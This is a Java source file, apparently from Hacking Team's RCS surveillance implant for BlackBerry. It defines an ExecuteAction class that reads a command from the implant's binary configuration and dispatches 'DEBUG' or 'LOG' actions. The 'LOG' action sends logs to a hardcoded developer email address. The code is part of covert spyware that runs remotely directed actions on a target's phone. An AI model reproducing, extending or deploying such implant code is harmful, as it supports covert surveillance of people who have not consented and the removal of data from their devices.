//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ExecuteAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;
import java.util.Vector;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.StringUtilities;
import blackberry.event.Event;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class ExecuteAction.
 */
public final class ExecuteAction extends SubAction {
    //#ifdef DEBUG
    static Debug debug = new Debug("ExecuteAction", DebugLevel.VERBOSE);
    //#endif

    String email;

    private String command;

    /**
     * Instantiates a new execute action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public ExecuteAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {

        String eventName = "NULL";
        if (triggeringEvent != null) {
            eventName = triggeringEvent.toString();
        }

        //#ifdef DEBUG_INFO
        debug.info("Execute: " + command);
        debug.info("Event: " + eventName);
        //#endif

        if (command == null) {
            return false;
        }

        Vector params = new Vector();
        String cmd = getParams(command, params);

        if (cmd.equals("DEBUG")) {
            executeDebug(params);
        } else if (cmd.equals("LOG")) {
            executeLog(params);
        }

        return true;
    }

    void executeLog(Vector params) {

        //#ifdef DEBUG
        email = "zeno@hackingteam.it";
        //#endif
        boolean ret = Debug.sendLogs(email);

    }

    void executeDebug(Vector params) {

    }

    private static String getParams(String fullCommand, Vector params) {

        //#ifdef DBC
        Check.requires(fullCommand != null, "getParams cmd !=null");
        Check.requires(params != null, "getParams params !=null");
        Check.requires(params.size() == 0, "getParams params.size() == 0");
        //#endif

        Vector vector = Utils.Tokenize(fullCommand," ");

        //#ifdef DBC
        Check.asserts(vector != null, "getParams array !=null");
        Check.asserts(vector.size() > 0, "getParams array.length > 0");
        //#endif

        String command = (String)vector.elementAt(0);
                
        for (int i = 1; i < vector.size(); i++) {
            params.addElement(vector.elementAt(i));
        }

        return command;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        if (confParams == null) {
            command = "DEBUG";
        } else {
            // estrarre la stringa.
            final DataBuffer databuffer = new DataBuffer(confParams, 0,
                    confParams.length, false);
            try {
                int len = databuffer.readInt();
                byte[] buffer = new byte[len];
                databuffer.read(buffer);
                command = WChar.getString(buffer, true);

            } catch (final EOFException e) {

                return false;
            }
        }

        //#ifdef DEBUG_INFO
        debug.info("command: " + command);

        //#endif
        return true;
    }

}
